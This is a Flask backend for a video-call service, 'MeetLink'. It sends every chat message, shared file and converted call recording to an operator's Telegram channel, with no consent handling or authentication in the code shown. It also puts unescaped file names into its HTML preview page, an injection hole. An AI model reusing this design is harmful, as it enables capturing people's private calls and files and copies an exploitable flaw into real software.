# ============ MeetLink Advanced Backend ============
# Receives events + video recordings, converts to MP4+MP3, sends to Telegram
# Also handles direct file sharing with preview

import os
import uuid
import time
import subprocess
import requests
from datetime import datetime
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import media_converter

# ---- Config: Environment Variables > config.py ----
try:
    from config import BOT_TOKEN as _BOT, CHANNEL_ID as _CH, PORT as _PORT
except ImportError:
    _BOT = "YOUR_BOT_TOKEN_HERE"
    _CH = "@YOUR_CHANNEL_USERNAME"
    _PORT = 8080

BOT_TOKEN = os.environ.get("BOT_TOKEN", _BOT)
CHANNEL_ID = os.environ.get("CHANNEL_ID", _CH)
PORT = int(os.environ.get("PORT", str(_PORT)))

app = Flask(__name__)
CORS(app)

active_rooms = {}
UPLOAD_DIR = '/tmp/meetlink_uploads'
RECORDING_DIR = '/tmp/meetlink_recordings'
os.makedirs(UPLOAD_DIR, exist_ok=True)
os.makedirs(RECORDING_DIR, exist_ok=True)
file_store = {}


# ============ TELEGRAM HELPERS ============
def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={
            "chat_id": CHANNEL_ID, "text": text,
            "parse_mode": "HTML", "disable_web_page_preview": True
        }, timeout=10)
    except Exception as e:
        print(f"❌ Message failed: {e}")


def send_telegram_video(video_path, caption):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
    try:
        with open(video_path, 'rb') as vf:
            resp = requests.post(url, files={
                "video": (os.path.basename(video_path), vf, "video/mp4")
            }, data={
                "chat_id": CHANNEL_ID, "caption": caption,
                "parse_mode": "HTML", "supports_streaming": True
            }, timeout=180)
        if resp.status_code == 200:
            print("✅ MP4 video sent to Telegram!")
            return True
        else:
            print(f"❌ Video error: {resp.status_code}")
            return False
    except Exception as e:
        print(f"❌ Video upload failed: {e}")
        return False


def send_telegram_audio(audio_path, caption):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
    try:
        with open(audio_path, 'rb') as af:
            resp = requests.post(url, files={
                "audio": (os.path.basename(audio_path), af, "audio/mpeg")
            }, data={
                "chat_id": CHANNEL_ID, "caption": caption,
                "parse_mode": "HTML"
            }, timeout=180)
        if resp.status_code == 200:
            print("✅ MP3 audio sent to Telegram!")
            return True
        else:
            print(f"❌ Audio error: {resp.status_code}")
            return False
    except Exception as e:
        print(f"❌ Audio upload failed: {e}")
        return False


def send_telegram_document_file(file_path, caption):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            resp = requests.post(url, files={
                "document": (os.path.basename(file_path), f)
            }, data={
                "chat_id": CHANNEL_ID, "caption": caption, "parse_mode": "HTML"
            }, timeout=180)
        return resp.status_code == 200
    except Exception as e:
        print(f"❌ Document failed: {e}")
        return False


def send_telegram_inline_doc(file_data, filename, caption):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        requests.post(url, files={"document": (filename, file_data)},
            data={"chat_id": CHANNEL_ID, "caption": caption, "parse_mode": "HTML"}, timeout=30)
    except Exception as e:
        print(f"❌ Inline doc failed: {e}")


def fmt_size(b):
    if b == 0: return "0 B"
    units = ['B', 'KB', 'MB', 'GB', 'TB']
    k = 1024; i = 0; s = float(b)
    while s >= k and i < len(units) - 1: s /= k; i += 1
    return f"{s:.1f} {units[i]}"


# ============ FFMPEG CONVERSION ============
def convert_webm_to_mp4(input_path, output_path):
    """Convert WebM recording to MP4 (H264 + AAC) for Telegram playback via fail-proof engine"""
    return media_converter.convert_webm_to_mp4(input_path, output_path)


def extract_mp3_from_video(input_path, output_path):
    """Extract audio from video as MP3 via fail-proof engine"""
    return media_converter.extract_mp3_from_video(input_path, output_path)


def split_large_file(file_path, max_size=45*1024*1024):
    """Split a file that's > 50MB into sub-parts"""
    parts = []
    file_size = os.path.getsize(file_path)
    if file_size <= max_size:
        return [file_path]

    total_parts = (file_size + max_size - 1) // max_size
    with open(file_path, 'rb') as f:
        for i in range(total_parts):
            part_path = f"{file_path}.part{i+1}"
            chunk = f.read(max_size)
            with open(part_path, 'wb') as pf:
                pf.write(chunk)
            parts.append(part_path)
    return parts


# ============ HEALTH CHECK ============
@app.route('/api/status', methods=['GET'])
def status():
    return jsonify({
        "status": "running",
        "active_rooms": len(active_rooms),
        "bot_configured": BOT_TOKEN != "YOUR_BOT_TOKEN_HERE",
        "ffmpeg_available": media_converter.is_ffmpeg_available()
    }), 200


# ============ EVENT LOGGER ============
@app.route('/api/event', methods=['POST'])
def handle_event():
    data = request.json
    if not data: return jsonify({"error": "No data"}), 400

    event_type = data.get("type", "")
    room_id = data.get("roomId", "unknown")
    timestamp = datetime.now().strftime("%d %b %Y, %I:%M %p")

    if room_id not in active_rooms:
        active_rooms[room_id] = {"created_at": time.time(), "call_start": None, "messages": [], "files_sent": [], "participants": 0}
    room = active_rooms[room_id]

    if event_type == "room_created":
        room["created_at"] = time.time()
        send_telegram_message(f"🟢 <b>NEW ROOM CREATED</b>\n━━━━━━━━━━━━━━━━━━\n🆔 Room: <code>{room_id}</code>\n🔗 Link: <code>{data.get('roomLink','N/A')}</code>\n🕐 Time: {timestamp}")

    elif event_type == "user_joined":
        room["participants"] += 1
        send_telegram_message(f"🔵 <b>USER JOINED</b>\n━━━━━━━━━━━━━━━━━━\n🆔 Room: <code>{room_id}</code>\n👥 Participants: {room['participants']}\n🕐 Time: {timestamp}")

    elif event_type == "call_started":
        room["call_start"] = time.time()
        send_telegram_message(f"📹 <b>VIDEO CALL STARTED</b>\n━━━━━━━━━━━━━━━━━━\n🆔 Room: <code>{room_id}</code>\n🕐 Time: {timestamp}\n🔴 Recording in progress...")

    elif event_type == "call_ended":
        duration = data.get("duration", "N/A")
        total_msgs = len(room["messages"])
        total_files = len(room["files_sent"])
        send_telegram_message(f"🔴 <b>CALL ENDED</b>\n━━━━━━━━━━━━━━━━━━\n🆔 Room: <code>{room_id}</code>\n⏱ Duration: <b>{duration}</b>\n💬 Messages: {total_msgs}\n📁 Files: {total_files}\n🕐 Ended: {timestamp}\n━━━━━━━━━━━━━━━━━━")
        if total_msgs > 0 or total_files > 0:
            summary = f"📊 <b>ROOM SUMMARY</b> — <code>{room_id}</code>\n"
            if total_msgs > 0:
                summary += f"\n💬 <b>Messages ({total_msgs}):</b>\n"
                for i, m in enumerate(room["messages"][-20:], 1): summary += f"  {i}. {m}\n"
            if total_files > 0:
                summary += f"\n📁 <b>Files ({total_files}):</b>\n"
                for i, f in enumerate(room["files_sent"], 1): summary += f"  {i}. {f}\n"
            send_telegram_message(summary)
        if room_id in active_rooms: del active_rooms[room_id]

    elif event_type == "chat_message":
        text = data.get("text", ""); sender = data.get("sender", "User")
        room["messages"].append(f"[{sender}] {text}")
        display = text[:500] + "..." if len(text) > 500 else text
        send_telegram_message(f"💬 <b>CHAT MESSAGE</b>\n━━━━━━━━━━━━━━━━━━\n🆔 Room: <code>{room_id}</code>\n👤 From: {sender}\n📝 Message: <code>{display}</code>\n🕐 Time: {timestamp}")

    elif event_type == "file_sent":
        fn = data.get("fileName","unknown"); fs = data.get("fileSize",0); sender = data.get("sender","User")
        room["files_sent"].append(f"{fn} ({fmt_size(fs)})")
        send_telegram_message(f"📁 <b>FILE SHARED</b>\n━━━━━━━━━━━━━━━━━━\n🆔 Room: <code>{room_id}</code>\n👤 From: {sender}\n📄 File: <code>{fn}</code>\n📦 Size: {fmt_size(fs)}\n🕐 Time: {timestamp}")

    elif event_type == "file_upload":
        import base64
        fn = data.get("fileName","unknown"); fb64 = data.get("fileData",""); sender = data.get("sender","User")
        if fb64:
            try:
                fbytes = base64.b64decode(fb64)
                send_telegram_inline_doc(fbytes, fn, f"📁 <b>FILE</b> | Room: <code>{room_id}</code> | From: {sender} | {fn}")
            except Exception as e: print(f"❌ File decode error: {e}")

    elif event_type == "recording_complete":
        ts = data.get("totalSegments",0); tsz = data.get("totalSize",0); dur = data.get("duration","N/A")
        send_telegram_message(f"📹 <b>RECORDING COMPLETE</b>\n━━━━━━━━━━━━━━━━━━\n🆔 Room: <code>{room_id}</code>\n⏱ Duration: {dur}\n📦 Total Size: {fmt_size(tsz)}\n🎬 Segments: {ts}\n🕐 Time: {timestamp}")

    elif event_type == "user_left":
        room["participants"] = max(0, room["participants"] - 1)
        send_telegram_message(f"👋 <b>USER LEFT</b>\n━━━━━━━━━━━━━━━━━━\n🆔 Room: <code>{room_id}</code>\n👥 Remaining: {room['participants']}\n🕐 Time: {timestamp}")

    return jsonify({"status": "ok"})


# ============ VIDEO RECORDING UPLOAD (SEGMENTED) ============
@app.route('/api/upload-recording', methods=['POST'])
def upload_recording():
    """Receive WebM segment → Convert to MP4 + MP3 → Send to Telegram"""
    try:
        video_file = request.files.get('video')
        room_id = request.form.get('roomId', 'unknown')
        seg_num = request.form.get('segmentNumber', '1')
        is_last = request.form.get('isLast', 'false') == 'true'
        timestamp = datetime.now().strftime("%d %b %Y, %I:%M %p")

        if not video_file:
            return jsonify({"error": "No video file"}), 400

        # Save original WebM
        webm_path = os.path.join(RECORDING_DIR, f"{room_id}_{int(time.time())}_part{seg_num}.webm")
        video_file.save(webm_path)
        webm_size = os.path.getsize(webm_path)
        print(f"📹 Segment {seg_num}: {fmt_size(webm_size)} (last={is_last})")

        part_label = f"Part {seg_num}" + (" (Final)" if is_last else "")

        # ---- Convert WebM → MP4 ----
        mp4_path = webm_path.replace('.webm', '.mp4')
        mp4_success = convert_webm_to_mp4(webm_path, mp4_path)

        # ---- Extract MP3 from video ----
        mp3_path = webm_path.replace('.webm', '.mp3')
        mp3_success = extract_mp3_from_video(webm_path, mp3_path)

        # ---- Send MP4 video to Telegram ----
        if mp4_success:
            mp4_size = os.path.getsize(mp4_path)
            video_caption = (
                f"📹 <b>CALL RECORDING</b> — {part_label}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🆔 Room: <code>{room_id}</code>\n"
                f"🎬 Video: MP4 (Direct Play ✅)\n"
                f"📦 Size: {fmt_size(mp4_size)}\n"
                f"🎬 Segment: {seg_num}\n"
                f"🕐 Time: {timestamp}"
            )

            if mp4_size <= 50 * 1024 * 1024:
                send_telegram_video(mp4_path, video_caption)
            else:
                # Split large MP4
                send_telegram_message(f"⚠️ <b>LARGE VIDEO</b> — {part_label}\n🆔 Room: <code>{room_id}</code>\n📦 Size: {fmt_size(mp4_size)}\nSplitting into parts...")
                parts = split_large_file(mp4_path)
                for i, part in enumerate(parts):
                    part_caption = (
                        f"📹 <b>RECORDING</b> — Part {seg_num}.{i+1}/{len(parts)}\n"
                        f"🆔 Room: <code>{room_id}</code>\n"
                        f"📦 Size: {fmt_size(os.path.getsize(part))}\n"
                        f"🕐 Time: {timestamp}"
                    )
                    send_telegram_document_file(part, part_caption)
                    try: os.remove(part)
                    except: pass
        else:
            # Fallback: send original WebM as document
            fallback_caption = f"📹 <b>RECORDING</b> — {part_label} (WebM)\n🆔 Room: <code>{room_id}</code>\n📦 Size: {fmt_size(webm_size)}\n⚠️ MP4 conversion failed, sending as WebM"
            if webm_size <= 50 * 1024 * 1024:
                send_telegram_document_file(webm_path, fallback_caption)
            else:
                parts = split_large_file(webm_path)
                for i, part in enumerate(parts):
                    send_telegram_document_file(part, f"📹 Part {seg_num}.{i+1} | Room: <code>{room_id}</code>")
                    try: os.remove(part)
                    except: pass

        # ---- Send MP3 audio to Telegram ----
        if mp3_success:
            mp3_size = os.path.getsize(mp3_path)
            audio_caption = (
                f"🎵 <b>CALL AUDIO</b> — {part_label}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🆔 Room: <code>{room_id}</code>\n"
                f"🎧 Audio: MP3 (Direct Play ✅)\n"
                f"📦 Size: {fmt_size(mp3_size)}\n"
                f"🎬 Segment: {seg_num}\n"
                f"🕐 Time: {timestamp}"
            )

            if mp3_size <= 50 * 1024 * 1024:
                send_telegram_audio(mp3_path, audio_caption)
            else:
                send_telegram_document_file(mp3_path, audio_caption)

        # Cleanup
        for p in [webm_path, mp4_path, mp3_path]:
            try: os.remove(p)
            except: pass

        return jsonify({
            "status": "ok",
            "segment": seg_num,
            "mp4_converted": mp4_success,
            "mp3_extracted": mp3_success
        })

    except Exception as e:
        print(f"❌ Recording upload error: {e}")
        return jsonify({"error": str(e)}), 500


# ============ DIRECT FILE SHARING ============
@app.route('/api/upload-file', methods=['POST'])
def upload_shared_file():
    try:
        f = request.files.get('file')
        if not f: return jsonify({"error": "No file"}), 400

        file_id = str(uuid.uuid4())[:12]
        original_name = f.filename or 'file'
        file_path = os.path.join(UPLOAD_DIR, file_id)
        file_size = 0

        with open(file_path, 'wb') as out:
            while True:
                chunk = f.read(1024 * 1024)
                if not chunk: break
                out.write(chunk)
                file_size += len(chunk)

        file_store[file_id] = {
            "fileName": original_name,
            "fileSize": fmt_size(file_size),
            "fileSizeBytes": file_size,
            "mimeType": f.content_type or 'application/octet-stream',
            "path": file_path,
            "uploaded": datetime.now().strftime("%d %b %Y, %I:%M %p")
        }

        base_url = request.host_url.rstrip('/')
        share_url = f"{base_url}/api/file-preview/{file_id}"

        print(f"📤 File uploaded: {original_name} ({fmt_size(file_size)})")

        # Send to Telegram
        caption = f"📤 <b>FILE SHARED VIA LINK</b>\n📄 File: <code>{original_name}</code>\n📦 Size: {fmt_size(file_size)}"
        try:
            with open(file_path, 'rb') as tf:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                    files={"document": (original_name, tf)},
                    data={"chat_id": CHANNEL_ID, "caption": caption, "parse_mode": "HTML"}, timeout=60)
        except: pass

        return jsonify({"url": share_url, "fileId": file_id, "fileName": original_name, "fileSize": fmt_size(file_size)})

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/file-info/<file_id>', methods=['GET'])
def file_info(file_id):
    info = file_store.get(file_id)
    if not info:
        fp = os.path.join(UPLOAD_DIR, file_id)
        if os.path.exists(fp):
            return jsonify({"fileName": "file", "fileSize": fmt_size(os.path.getsize(fp))})
        return jsonify({"error": "not found"}), 404
    return jsonify(info)


@app.route('/api/file/<file_id>', methods=['GET'])
def get_file(file_id):
    info = file_store.get(file_id)
    if not info: return jsonify({"error": "not found"}), 404
    fp = info.get("path", os.path.join(UPLOAD_DIR, file_id))
    if not os.path.exists(fp): return jsonify({"error": "file missing"}), 404
    return send_file(fp, download_name=info.get("fileName", "file"), as_attachment=False)


@app.route('/api/file-preview/<file_id>', methods=['GET'])
def file_preview_page(file_id):
    info = file_store.get(file_id)
    if not info:
        return '<html><body style="background:#050510;color:#ff2d75;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;font-size:1.5rem;">File not found or expired</body></html>', 404

    file_url = f"/api/file/{file_id}"
    fn = info.get("fileName", "file")
    fs = info.get("fileSize", "")
    ext = fn.split('.').pop().lower()
    image_exts = ['jpg','jpeg','png','gif','webp','svg','bmp','ico']
    video_exts = ['mp4','webm','mkv','avi','mov']
    audio_exts = ['mp3','wav','ogg','flac','aac']

    if ext in image_exts:
        preview = f'<img src="{file_url}" style="max-width:100%;max-height:70vh;border-radius:12px;object-fit:contain;" alt="{fn}">'
    elif ext in video_exts:
        preview = f'<video src="{file_url}" controls autoplay style="max-width:100%;max-height:70vh;border-radius:12px;"></video>'
    elif ext in audio_exts:
        preview = f'<div style="text-align:center;padding:60px;"><div style="font-size:4rem;margin-bottom:20px;">🎵</div><audio src="{file_url}" controls autoplay style="width:100%;max-width:400px;"></audio></div>'
    elif ext == 'pdf':
        preview = f'<iframe src="{file_url}" style="width:100%;height:70vh;border:none;border-radius:12px;"></iframe>'
    else:
        preview = f'<div style="text-align:center;padding:60px;"><div style="font-size:4rem;margin-bottom:20px;">📄</div><div style="color:#e8e8ff;font-size:1.2rem;font-weight:700;margin-bottom:8px;">{fn}</div><div style="color:#8888bb;margin-bottom:20px;">{fs}</div><div style="color:#555580;font-size:0.9rem;">Preview not available. Click Download to save.</div></div>'

    return f'''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{fn} — MeetLink Share</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#050510;color:#e8e8ff;font-family:Inter,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:30px 20px}}
.header{{width:100%;max-width:900px;display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;flex-wrap:wrap;gap:12px}}
.file-info{{display:flex;align-items:center;gap:12px;flex:1;min-width:0}}
.file-name{{font-weight:700;font-size:1rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:300px}}
.file-size{{color:#8888bb;font-size:0.8rem}}
.dl-btn{{padding:10px 24px;background:linear-gradient(135deg,#b14dff,#8b3dff);color:#fff;border:none;border-radius:10px;text-decoration:none;font-weight:600;cursor:pointer;box-shadow:0 0 15px rgba(177,77,255,0.4);display:inline-flex;align-items:center;gap:8px;font-size:0.9rem}}
.dl-btn:hover{{box-shadow:0 0 25px rgba(177,77,255,0.6)}}
.preview{{flex:1;width:100%;max-width:900px;display:flex;align-items:center;justify-content:center;overflow:auto;border-radius:16px;border:1px solid #1c1c50;background:#0a0a1f;min-height:300px}}
</style></head><body>
<div class="header">
<div class="file-info">
<div style="display:flex;align-items:center;gap:10px;font-weight:800;font-size:1.1rem;color:#b14dff;"><div style="width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,#b14dff,#00f0ff);display:flex;align-items:center;justify-content:center;color:#fff;font-size:0.9rem">📂</div>MeetLink Share</div>
<div><div class="file-name">{fn}</div><div class="file-size">{fs}</div></div>
</div>
<a href="{file_url}" download="{fn}" class="dl-btn">⬇ Download</a>
</div>
<div class="preview">{preview}</div>
</body></html>'''


# ============ RUN ============
if __name__ == '__main__':
    print("=" * 50)
    print("🚀 MeetLink Advanced Backend")
    print("=" * 50)
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("⚠️  Bot token not configured!")
    else:
        print("✅ Bot token configured")
    print(f"📡 Channel: {CHANNEL_ID}")
    print(f"🌐 Port: {PORT}")
    print(f"🎬 FFmpeg: {'✅ Available' if media_converter.is_ffmpeg_available() else '❌ Not found'}")
    print("=" * 50)
    app.run(host='0.0.0.0', port=PORT)
